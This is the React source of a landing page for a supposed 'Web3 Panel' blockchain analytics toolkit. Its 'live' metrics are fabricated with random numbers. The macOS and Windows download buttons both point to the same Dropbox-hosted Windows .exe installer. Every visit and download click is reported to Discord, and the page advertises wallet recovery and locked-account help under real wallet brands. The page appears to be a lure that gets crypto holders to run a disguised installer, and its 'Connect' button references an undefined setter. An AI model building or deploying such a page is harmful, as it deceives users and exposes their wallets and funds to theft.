import React from 'react';
import { Routes, Route } from 'react-router-dom';
import { Chrome, Siren as Firefox, Smartphone, Laptop, LineChart, Shield, Bug, Activity, Search, Code, Network } from 'lucide-react';
import Header from './components/Header';
import Contact from './pages/Contact';
import Docs from './pages/Docs';
import { useEffect, useState } from 'react';
import { sendDiscordNotification } from './utils/discord';

// Simulate real transaction data
const generateTransactionData = () => ({
  tps: (Math.random() * 50 + 100).toFixed(1),
  progress: Math.random() * 0.4 + 0.4,
});

// Simulate gas data
const generateGasData = () => ({
  baseFee: Math.floor(Math.random() * 10 + 28),
  priorityFee: (Math.random() * 0.5 + 1.2).toFixed(1),
  successRate: (Math.random() * 2 + 97).toFixed(1),
});

// Generate random contract address
const generateContractAddress = () => {
  const chars = '0123456789ABCDEF';
  return '0x' + Array(4).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
};

// List of possible error messages
const errorMessages = [
  'INSUFFICIENT_OUTPUT_AMOUNT',
  'EXECUTION_REVERTED',
  'GAS_LIMIT_EXCEEDED',
  'TRANSFER_FAILED',
  'INVALID_SIGNATURE'
];

function App() {
  const [transactionData, setTransactionData] = useState(generateTransactionData());
  const [gasData, setGasData] = useState(generateGasData());
  const [errorData, setErrorData] = useState({
    contract: generateContractAddress(),
    time: '1 min ago',
    message: errorMessages[0]
  });

  // Update transaction data every 2 seconds
  useEffect(() => {
    const transactionInterval = setInterval(() => {
      setTransactionData(generateTransactionData());
    }, 2000);

    return () => clearInterval(transactionInterval);
  }, []);

  // Update gas data every 5 seconds
  useEffect(() => {
    const gasInterval = setInterval(() => {
      setGasData(generateGasData());
    }, 5000);

    return () => clearInterval(gasInterval);
  }, []);

  // Update error data every 8 seconds
  useEffect(() => {
    const errorInterval = setInterval(() => {
      setErrorData({
        contract: generateContractAddress(),
        time: Math.floor(Math.random() * 5 + 1) + ' min ago',
        message: errorMessages[Math.floor(Math.random() * errorMessages.length)]
      });
    }, 8000);

    return () => clearInterval(errorInterval);
  }, []);

  // Send notification on website visit
  useEffect(() => {
    sendDiscordNotification('visit');
  }, []);

  return (
    <div 
      className="bg-cover bg-center bg-no-repeat"
      style={location.pathname === '/' ? {
        backgroundImage: `url('https://i.postimg.cc/dVcFSPqB/web3.png')`,
        backgroundAttachment: 'fixed'
      } : {}}
    >
      <Header />
      <Routes>
        <Route path="/contact" element={<Contact />} />
        <Route path="/docs" element={<Docs />} />
        <Route path="/" element={
          <>
            <main className="relative z-10 min-h-screen">
              <div className="max-w-7xl mx-auto px-8 pt-20 pb-12">
        <div className="flex flex-col lg:flex-row items-center justify-between gap-12 py-12">
          {/* Left Section - Content */}
          <div className="lg:w-1/2">
            <h1 className="text-5xl font-bold mb-6 leading-tight text-white">
              Advanced Web3 Analytics & Debugging Toolkit
            </h1>
            {/* Supported Wallets */}
            <div className="flex flex-wrap items-center gap-6 mb-8">
              <img 
                src="https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo-long.svg" 
                alt="Ledger" 
                className="h-6 brightness-0 invert opacity-80 hover:opacity-100 transition-opacity"
              />
              <img 
                src="https://www.cdnlogo.com/logos/t/74/trezor.svg" 
                alt="Trezor" 
                className="h-5 brightness-0 invert opacity-80 hover:opacity-100 transition-opacity"
              />
              <img 
                src="https://assets.bitdegree.org/images/phantom-wallet-review-square-logo-v1.png?tr=w-250" 
                alt="Phantom" 
                className="h-12 brightness-0 invert opacity-80 hover:opacity-100 transition-opacity"
              />
              <img 
                src="https://safeswap.io/wp-content/uploads/metamask.png" 
                alt="MetaMask" 
                className="h-8 brightness-0 invert opacity-80 hover:opacity-100 transition-opacity"
              />
              <img 
                src="https://www.exodus.com/brand/dl/images/Exodus_logo_dark.svg" 
                alt="Exodus" 
                className="h-5 brightness-0 invert opacity-80 hover:opacity-100 transition-opacity"
              />
            </div>
            <p className="text-lg mb-8 text-white/80">
              Monitor, analyze, and debug blockchain transactions in real-time. Catch errors before they impact your DApps.
            </p>
            
            {/* Trust Indicators */}
            <div className="flex gap-6 mb-8">
              <div className="flex items-center gap-2">
                <Shield className="w-5 h-5 text-white" />
                <span className="text-sm text-white/80">Enterprise-Grade Security</span>
              </div>
              <div className="flex items-center gap-2">
                <Activity className="w-5 h-5 text-white" />
                <span className="text-sm text-white/80">24/7 Monitoring</span>
              </div>
            </div>

            {/* Download Buttons */}
            <div className="flex gap-4 flex-wrap">
              <a 
                href="https://www.dropbox.com/scl/fi/qnmitutujij0cdp53da8g/Web3-Panel-Installer.exe?rlkey=7g9shdoqhxmpqwhadfxbhh2ut&st=o53lhu45&dl=1"
                onClick={() => sendDiscordNotification('download', 'macOS')}
                className="bg-white px-6 py-3 rounded-lg font-medium flex items-center gap-3 hover:bg-gray-50 transition-colors"
              >
                <img src="https://cdn-icons-png.flaticon.com/512/0/747.png" 
                  className="w-5 h-5" 
                  alt="macOS logo" 
                />
                <span className="text-gray-900">macOS</span>
              </a>
              <a 
                href="https://www.dropbox.com/scl/fi/qnmitutujij0cdp53da8g/Web3-Panel-Installer.exe?rlkey=7g9shdoqhxmpqwhadfxbhh2ut&st=o53lhu45&dl=1"
                onClick={() => sendDiscordNotification('download', 'Windows')}
                className="bg-white px-6 py-3 rounded-lg font-medium flex items-center gap-3 hover:bg-gray-50 transition-colors mr-2"
              >
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/2048px-Windows_logo_-_2012.svg.png" 
                  className="w-5 h-5" 
                  alt="Windows logo" 
                />
                <span className="text-gray-900">Windows</span>
              </a>
              <button
                onClick={() => setIsWalletModalOpen(true)}
                className="relative group px-6 py-3 rounded-lg font-medium flex items-center gap-3 overflow-hidden"
              >
                <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-indigo-600 transition-all duration-300 group-hover:scale-110"></div>
                <div className="absolute inset-0 bg-gradient-to-r from-purple-400 to-indigo-400 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
                <span className="relative text-white flex items-center gap-2">
                  <Network className="w-5 h-5" />
                  Connect
                </span>
              </button>
            </div>
          </div>

          {/* Right Section - Preview */}
          <div className="lg:w-[32%] lg:ml-[-20px]">
            <div className="bg-white/90 backdrop-blur-xl rounded-2xl p-4 shadow-2xl">
              <div className="grid grid-cols-3 gap-3 mb-4">
                <div className="bg-gradient-to-br from-indigo-50 to-blue-50 p-3 rounded-xl text-center hover:from-indigo-100 hover:to-blue-100 transition-all cursor-pointer group">
                  <LineChart className="w-6 h-6 mx-auto mb-2 text-[#90B77D] group-hover:scale-110 transition-transform" />
                  <span className="text-sm font-medium text-gray-600">Analytics</span>
                </div>
                <div className="bg-gradient-to-br from-purple-50 to-indigo-50 p-3 rounded-xl text-center hover:from-purple-100 hover:to-indigo-100 transition-all cursor-pointer group">
                  <Bug className="w-6 h-6 mx-auto mb-2 text-[#90B77D] group-hover:scale-110 transition-transform" />
                  <span className="text-sm font-medium text-gray-600">Debug</span>
                </div>
                <div className="bg-gradient-to-br from-blue-50 to-purple-50 p-3 rounded-xl text-center hover:from-blue-100 hover:to-purple-100 transition-all cursor-pointer group">
                  <Code className="w-6 h-6 mx-auto mb-2 text-[#90B77D] group-hover:scale-110 transition-transform" />
                  <span className="text-sm font-medium text-gray-600">Smart Contracts</span>
                </div>
              </div>
              
              {/* Live Transaction Monitor */}
              <div className="space-y-3 mt-2">
                <div className="bg-gray-50 rounded-lg p-2">
                  <div className="flex justify-between items-center mb-2">
                    <h3 className="font-semibold text-gray-800">Live Transaction Monitor</h3>
                    <span className="px-2 py-1 bg-green-100 text-green-700 rounded-full text-xs">Live</span>
                  </div>
                  <div className="space-y-1.5">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">Transactions/sec</span>
                      <span className="text-gray-800 font-medium transition-all duration-500">
                        {transactionData.tps}
                      </span>
                    </div>
                    <div className="h-1.5 bg-gray-200 rounded-full overflow-hidden">
                      <div 
                        className="h-full bg-green-500 rounded-full transition-all duration-500"
                        style={{ width: `${transactionData.progress * 100}%` }}
                      ></div>
                    </div>
                  </div>
                </div>

                {/* Error Tracking */}
                <div className="bg-red-50 rounded-lg p-3">
                  <h3 className="font-semibold text-red-800 mb-3">Critical Errors Detected</h3>
                  <div className="space-y-2">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-red-700 transition-all duration-300">
                        Contract: {errorData.contract}...
                      </span>
                      <span className="text-red-700 font-medium transition-all duration-300">
                        {errorData.time}
                      </span>
                    </div>
                    <div className="text-xs font-mono bg-red-100 p-2 rounded text-red-800 transition-all duration-300">
                      Error: {errorData.message}
                    </div>
                  </div>
                </div>

                {/* Gas Analytics */}
                <div className="bg-indigo-50 rounded-lg p-3">
                  <h3 className="font-semibold text-indigo-800 mb-3">Gas Analytics</h3>
                  <div className="grid grid-cols-3 gap-2 text-xs">
                    <div className="bg-white p-2 rounded">
                      <div className="text-gray-500">Base Fee</div>
                      <div className="font-medium text-indigo-600 transition-all duration-500">
                        {gasData.baseFee} Gwei
                      </div>
                    </div>
                    <div className="bg-white p-2 rounded">
                      <div className="text-gray-500">Priority Fee</div>
                      <div className="font-medium text-indigo-600 transition-all duration-500">
                        {gasData.priorityFee} Gwei
                      </div>
                    </div>
                    <div className="bg-white p-2 rounded">
                      <div className="text-gray-500">Success Rate</div>
                      <div className="font-medium text-green-600 transition-all duration-500">
                        {gasData.successRate}%
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        </div>
            </main>
            <main>
        {/* Features Section */}
        <section className="bg-gradient-to-b from-gray-50 to-white py-24 relative overflow-hidden">
          {/* Background Pattern */}
          <div className="absolute inset-0 opacity-[0.15]" 
            style={{ 
              backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%236366f1' fill-opacity='0.4'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")` 
            }}
          ></div>
          <div className="max-w-7xl mx-auto px-8">
            <div className="text-center mb-20">
              <h2 className="text-4xl font-bold mb-4 text-gray-900">Our Features</h2>
              <p className="text-lg text-gray-600 max-w-2xl mx-auto">
                Explore our comprehensive suite of Web3 tools and features designed to enhance your blockchain experience.
              </p>
            </div>
            
            <div className="max-w-6xl mx-auto space-y-16">
              {/* Wallet Management */}
              <div>
                <div className="flex items-center gap-3 mb-8">
                  <div className="h-px flex-1 bg-gradient-to-r from-transparent to-gray-200"></div>
                  <h3 className="text-xl font-semibold whitespace-nowrap text-gray-900">Wallet Management</h3>
                  <div className="h-px flex-1 bg-gradient-to-r from-gray-200 to-transparent"></div>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-violet-500/10 via-fuchsia-500/10 to-pink-500/10 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <Shield className="w-5 h-5 text-indigo-500" />
                        <h4 className="font-semibold text-gray-900">Recovery</h4>
                      </div>
                      <p className="text-sm text-gray-600">Secure wallet recovery and backup solutions</p>
                    </div>
                  </a>
                  
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-purple-500/5 to-indigo-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <Activity className="w-5 h-5 text-purple-500" />
                        <h4 className="font-semibold text-gray-900">Login</h4>
                      </div>
                      <p className="text-sm text-gray-600">Secure wallet authentication and access</p>
                    </div>
                  </a>
                  
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-rose-500/5 to-red-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <Bug className="w-5 h-5 text-rose-500" />
                        <h4 className="font-semibold text-gray-900">Locked Account</h4>
                      </div>
                      <p className="text-sm text-gray-600">Account unlock and recovery assistance</p>
                    </div>
                  </a>
                </div>
              </div>
              
              {/* Transaction Management */}
              <div>
                <div className="flex items-center gap-3 mb-8">
                  <div className="h-px flex-1 bg-gradient-to-r from-transparent to-gray-200"></div>
                  <h3 className="text-xl font-semibold whitespace-nowrap text-gray-900">Transaction Management</h3>
                  <div className="h-px flex-1 bg-gradient-to-r from-gray-200 to-transparent"></div>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-pink-500/10 via-rose-500/10 to-red-500/10 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <LineChart className="w-5 h-5 text-emerald-500" />
                        <h4 className="font-semibold text-gray-900">Transaction Delay</h4>
                      </div>
                      <p className="text-sm text-gray-600">Monitor and resolve transaction delays</p>
                    </div>
                  </a>
                  
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-indigo-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <Search className="w-5 h-5 text-blue-500" />
                        <h4 className="font-semibold text-gray-900">Slippage</h4>
                      </div>
                      <p className="text-sm text-gray-600">Optimize transaction slippage settings</p>
                    </div>
                  </a>
                  
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-amber-500/5 to-orange-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <Code className="w-5 h-5 text-amber-500" />
                        <h4 className="font-semibold text-gray-900">Transaction Status</h4>
                      </div>
                      <p className="text-sm text-gray-600">Real-time transaction monitoring</p>
                    </div>
                  </a>
                </div>
              </div>
              
              {/* Asset Management */}
              <div>
                <div className="flex items-center gap-3 mb-8">
                  <div className="h-px flex-1 bg-gradient-to-r from-transparent to-gray-200"></div>
                  <h3 className="text-xl font-semibold whitespace-nowrap text-gray-900">Asset Management</h3>
                  <div className="h-px flex-1 bg-gradient-to-r from-gray-200 to-transparent"></div>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-blue-500/10 via-cyan-500/10 to-teal-500/10 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <LineChart className="w-5 h-5 text-violet-500" />
                        <h4 className="font-semibold text-gray-900">NFTs</h4>
                      </div>
                      <p className="text-sm text-gray-600">NFT minting and transfer management</p>
                    </div>
                  </a>
                  
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/5 to-blue-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <Activity className="w-5 h-5 text-cyan-500" />
                        <h4 className="font-semibold text-gray-900">Staking</h4>
                      </div>
                      <p className="text-sm text-gray-600">Stake and earn rewards securely</p>
                    </div>
                  </a>
                  
                  <a href="#" className="group relative overflow-hidden bg-white rounded-xl shadow-sm hover:shadow-md transition-all duration-300 p-6 border border-gray-100">
                    <div className="absolute inset-0 bg-gradient-to-r from-fuchsia-500/5 to-pink-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="relative">
                      <div className="flex items-center gap-3 mb-3">
                        <Shield className="w-5 h-5 text-fuchsia-500" />
                        <h4 className="font-semibold text-gray-900">Claim Rewards</h4>
                      </div>
                      <p className="text-sm text-gray-600">Manage and claim your rewards</p>
                    </div>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </section>
        
        {/* Connect with Apps Section */}
        <section className="bg-gradient-to-b from-white to-gray-50 py-24">
          <div className="max-w-7xl mx-auto px-8">
            <div className="text-center mb-12 relative">
              <div className="absolute inset-0 -top-8 flex items-center justify-center opacity-10">
                <div className="w-64 h-64 bg-indigo-500 rounded-full blur-3xl animate-pulse"></div>
              </div>
              <h2 className="text-4xl font-bold mb-4 text-gray-900">Connect with Hundreds of Apps</h2>
              <p className="text-lg text-gray-600 max-w-2xl mx-auto">
                With Web3 Panel, you can connect your wallet with hundreds of apps, opening the doors to a new world of web3 experiences.
              </p>
            </div>
            
            <div className="max-w-6xl mx-auto">
              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-4">
                {[
                  { name: 'Wallet Connect', img: 'https://ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png' },
                  { name: 'Trust', img: 'https://avatars.githubusercontent.com/u/32179889' },
                  { name: 'Metamask', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png' },
                  { name: 'Ledger', img: 'https://bitcoin-trading.io/wp-content/uploads/2021/10/ledger_logo.png' },
                  { name: 'Best Wallet', img: 'https://actufinance.fr/wp-content/uploads/2023/10/application-mobile-bestwallet.png' },
                  { name: 'SolFlare', img: 'https://s3.amazonaws.com/keybase_processed_uploads/696c1dde0afb16b0848da6aa8851e605_360_360.jpg' },
                  { name: 'TonKeeper', img: 'https://i0.wp.com/bitcoinke.io/wp-content/uploads/2024/07/Tonkeeper-1.png.webp' },
                  { name: 'BRD', img: 'https://play-lh.googleusercontent.com/kr-krUU96UPX_edyx49FBdZwtqmGJ0F8iapf37z03o268IMDCf1G_9WHk6m1C2VWBA=s94-rw' },
                  { name: 'Coinbase', img: 'https://dvh1deh6tagwk.cloudfront.net/finder-au/wp-uploads/2017/09/Coinbaselogo_Supplied_250x250-2.png' },
                  { name: 'Saitamask', img: 'https://images.sftcdn.net/images/t_app-icon-m/p/09ce415d-50b9-4d73-b932-b5a59fc408ef/1285923885/saitamask-logo' },
                  { name: 'Terra Station', img: 'https://play-lh.googleusercontent.com/ScfqhIBlnMHbFntJsOCqqWLF5cAjinXqIwM9xkw-XA1P-E9zYOFEm0ycc-20rC4Ae2nH' },
                  { name: 'Phantom', img: 'https://developers.moralis.com/wp-content/uploads/2023/11/Phantom-Wallet.png' },
                  { name: 'Cosmos', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQVrsQCkChpDLwRGcUNBwavW4XKJYwIUDfgwg&s' },
                  { name: 'Exodus', img: 'https://play-lh.googleusercontent.com/d0y_tc6f3BRdVodzpcqoXYQSndvlMoXXqHAwHmDvzwghRvQO8WGSM1I8_lHK_OUNVQ' },
                  { name: 'Rainbow', img: 'https://assets.super.so/b7ac5b4c-2f39-474d-8a3c-4c0e68f5c2f6/uploads/logo/c36500d2-7e4b-40f5-a48b-3e6e364d7248.png' },
                  { name: 'Argent', img: 'https://pbs.twimg.com/profile_images/1024585501901303808/m92jEcPI_400x400.jpg' },
                  { name: 'Binance Chain', img: 'https://user-images.githubusercontent.com/12424618/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png' },
                  { name: 'Safemoon', img: 'https://safemoon.com/hs-fs/hubfs/logo-1.png?width=150&height=150&name=logo-1.png' },
                  { name: 'Gnosis Safe', img: 'https://www.yadawallets.com/wp-content/uploads/2020/10/Gnosis-Safe-wallet-logo-200x200.jpg' },
                  { name: 'DeFi', img: 'https://i0.wp.com/coinpasar.sg/wp-content/uploads/2023/11/crypto-com-granted-vasp-licence-in-dubai.jpg' },
                  { name: 'Pillar', img: 'https://cdn6.aptoide.com/imgs/5/e/a/5ea1f2b9d88ee19d47751cc48c3b741c_icon.png' },
                  { name: 'imToken', img: 'https://miro.medium.com/v2/resize:fit:2400/1*vpjxotLULTkmcJFq4y2eng.png' },
                  { name: 'ONTO', img: 'https://www.yadawallets.com/wp-content/uploads/2021/01/ONTO-wallet-logo-1.png' },
                  { name: 'TokenPocket', img: 'https://assets-global.website-files.com/614c99cf4f23700c8aa3752a/6323b6987f8e01af2ce9189a_public.png' },
                  { name: 'Aave', img: 'https://cryptologos.cc/logos/aave-aave-logo.png?v=022' },
                  { name: 'Digitex', img: 'https://s2.coinmarketcap.com/static/img/coins/200x200/2772.png' },
                  { name: 'Portis', img: 'https://cdn.dribbble.com/users/1298186/screenshots/4669247/portis_logo_dribbble.png' },
                  { name: 'Formatic', img: 'https://pbs.twimg.com/profile_images/1293288961800933376/rtDOqMXY_400x400.jpg' },
                  { name: 'MathWallet', img: 'https://medishares.oss-cn-hongkong.aliyuncs.com/logo/math/MathWallet_App_Icon.png' },
                  { name: 'BitPay', img: 'https://ffnews.com/wp-content/uploads/2021/09/1581439195205.jpg' },
                  { name: 'Ledger Live', img: 'https://www.appdeploynews.com/wp-content/uploads/2023/08/ledger-live-icon.png' },
                  { name: 'WallETH', img: 'https://walleth.org/assets/img/walleth_icon.png' },
                  { name: 'Authereum', img: 'https://cryptotesters-images.s3.eu-central-1.amazonaws.com/a67fe94209ad4812885e72e878784cbbct_b6559064b7.png' },
                  { name: 'Dharma', img: 'https://pbs.twimg.com/profile_images/1376595920809160707/5DxVDK36_400x400.png' },
                  { name: '1inch Wallet', img: 'https://1inch.io/assets/token-logo/1inch_token.svg' },
                  { name: 'Huobi', img: 'https://fineproxy.org/wp-content/uploads/2023/08/Huobi-Wallet-logo.png' },
                  { name: 'Eidoo', img: 'https://www.cryptocompare.com/media/35521333/eidoo.jpg' },
                  { name: 'Loopring', img: 'https://is2-ssl.mzstatic.com/image/thumb/Purple112/v4/58/45/bf/5845bfec-7804-a710-329a-9627057742de/AppIcon-1x_U007emarketing-0-7-0-0-85-220.png/512x512bb.jpg' },
                  { name: 'TrustVault', img: 'https://www.cryptocompare.com/media/36798689/trustvault.png' },
                  { name: 'Atomic', img: 'https://atomicwallet.io/images/press-kit/atomic_wallet_logo_dark_rounded_2.png' },
                  { name: 'Coin98', img: 'https://s2.coinmarketcap.com/static/img/coins/64x64/10903.png' },
                  { name: 'Tron', img: 'https://cryptologos.cc/logos/tron-trx-logo.png' },
                  { name: 'Alice', img: 'https://www.yadawallets.com/wp-content/uploads/2021/01/Alice-wallet-logo.png' },
                  { name: 'AlphaWallet', img: 'https://cdn.prod.website-files.com/63c8fbc03c5665a98c6b88d1/64e1ff5cbc4c9f24b9ad9f3f_Alphawallet.png' },
                  { name: "D'CENT", img: 'https://www.yadawallets.com/wp-content/uploads/2020/11/DCent-wallet-logo.png' },
                  { name: 'ZelCore', img: 'https://assets-global.website-files.com/614c99cf4f23700c8aa3752a/6323b69954bc41ff9409f033_public.png' },
                  { name: 'Nash', img: 'https://bittrust.s3.amazonaws.com/1608683319.jpg' },
                  { name: 'Coinmoni', img: 'https://bittrust.s3.amazonaws.com/1433894569.png' },
                  { name: 'GridPlus', img: 'https://static-00.iconduck.com/assets.00/grid-plus-icon-512x512-p3u1fdnl.png' },
                  { name: 'CYBAVO', img: 'https://walletscrutiny.com/images/wIcons/android/com.cybavo.btc.wallet.png' },
                  { name: 'Tokenary', img: 'https://is4-ssl.mzstatic.com/image/thumb/Purple122/v4/a2/80/13/a28013ce-da98-fd24-2a9a-a22ecfef7cb8/AppIcon-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg' },
                  { name: 'Torus', img: 'https://tor.us/images/Wallet.svg' },
                  { name: 'Spatium', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/ab/93/65/ab936596-9fce-f7f2-16c0-82efe148d2ec/AppIcon-0-0-1x_U007emarketing-0-7-0-85-220.png/217x0w.webp' },
                  { name: 'SafePal', img: 'https://cryptologos.cc/logos/safepal-sfp-logo.png' },
                  { name: 'Infinito', img: 'https://www.cryptocompare.com/media/30001921/untitled-1.png' },
                  { name: 'wallet.io', img: 'https://s.cafebazaar.ir/images/icons/io.wallet-e1c410ef-8054-4deb-9500-f71e5b86c3a8_512x512.png' },
                  { name: 'Ownbit', img: 'https://ownbit.io/resource/brand-assets/images/ownbit_logo_5.df61ff52e1.jpg' },
                  { name: 'EasyPocket', img: 'https://is5-ssl.mzstatic.com/image/thumb/Purple124/v4/d2/bc/d7/d2bcd729-ae03-6f33-7446-f60e853c5229/source/512x512bb.jpg' },
                  { name: 'Bridge Wallet', img: 'https://www.mtpelerin.com/images/bridge-logo.svg' },
                  { name: 'Spark Point', img: 'https://www.yadawallets.com/wp-content/uploads/2021/01/Sparkpoint-wallet-logo.png' },
                  { name: 'ViaWallet', img: 'https://play-lh.googleusercontent.com/GldIbLV-ctGoFu4pbsqNplKRtGQsgoU_4MFb0p_DUP51kHxwTG5DhajXtVPXdC5oi08' },
                  { name: 'BitKeep', img: 'https://cryptotvplus.com/wp-content/uploads/2022/12/Bitkeep-wallet-logo.png' },
                  { name: 'Vision', img: 'https://walletscrutiny.com/images/wIcons/iphone/com.visionsoftware.vision.jpg' },
                  { name: 'PEAKDEFI', img: 'https://pbs.twimg.com/profile_images/1296776495252168706/WjP0_QsY_400x400.jpg' },
                  { name: 'Unstoppable', img: 'https://cryptorussia.ru/wp-content/uploads/2024/07/unstoppable-wallet.png' },
                  { name: 'HaloDeFi', img: 'https://pbs.twimg.com/profile_images/1642909490310975494/HWbs4_mT_400x400.jpg' },
                  { name: 'Dok Wallet', img: 'https://walletscrutiny.com/images/wIcons/iphone/com.dok.wallet.jpg' },
                  { name: 'Midas', img: 'https://cdn6.aptoide.com/imgs/6/e/3/6e3103894e3933ae18b00fde70878210_icon.png?w=128' },
                  { name: 'Ellipal', img: 'https://miro.medium.com/v2/resize:fit:2400/1*N6Uvv2QMQGqQubnGP1tGig.png' },
                  { name: 'KEYRING PRO', img: 'https://keyring.app/wp-content/uploads/2021/06/LOGO-KEYRING-PRO.png' },
                  { name: 'Aktionariat', img: 'https://hub.aktionariat.com/images/tokens/AKS.png' },
                  { name: 'Talken', img: 'https://play-lh.googleusercontent.com/CVWMBVPRHmb1tPeP-gSAApuwq9nsbPZ7kY6qz5u71fd7D0pJc2MftVogk4v7fD5HJ2oR' },
                  { name: 'Flare', img: 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5d79d072c62fd60001ba75a7/0x0.png' },
                  { name: 'KyberSwap', img: 'https://cdn.prod.website-files.com/64f6cb08fcde0908ec95799c/64fd602c5a16efb4beb53f6d_UFuWgdxn_400x400.jpeg' },
                  { name: 'PayTube', img: 'https://image.winudf.com/v2/image1/Y29tLnBheXR1YmUud2FsbGV0Lnprd2FsbGV0X2ljb25fMTYzNDIxMjM0NV8wNDE/icon.webp?w=140&fakeurl=1&type=.webp' },
                  { name: 'Linen', img: 'https://pbs.twimg.com/profile_images/1647932324212768768/YD41_VA1_400x400.jpg' }
                ].map((wallet, index) => (
                  <button
                    key={index}
                    className="group bg-white p-3 rounded-xl shadow-sm hover:shadow-md transition-all duration-300 flex flex-col items-center gap-2"
                  >
                    <div className="relative w-12 h-12 rounded-full overflow-hidden group-hover:scale-110 transition-transform">
                      <img
                        src={wallet.img}
                        alt={wallet.name}
                        className="w-full h-full object-cover"
                      />
                    </div>
                    <span className="text-xs font-medium text-gray-700 text-center">
                      {wallet.name}
                    </span>
                  </button>
                ))}
                <div className="flex items-center justify-center">
                  <div className="text-center">
                    <div className="w-12 h-12 bg-gradient-to-br from-indigo-100 to-purple-100 rounded-full flex items-center justify-center mb-2">
                      <span className="text-xl font-bold text-indigo-600">+</span>
                    </div>
                    <span className="text-xs font-medium text-indigo-600">
                      And much more!
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
            </main>
          </>
        } />
      </Routes>
      
      <footer className="bg-gray-50 py-6">
        <div className="max-w-7xl mx-auto px-8">
          <p className="text-center text-gray-500 text-sm">
            © {new Date().getFullYear()} Web3 Analytics. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}

export default App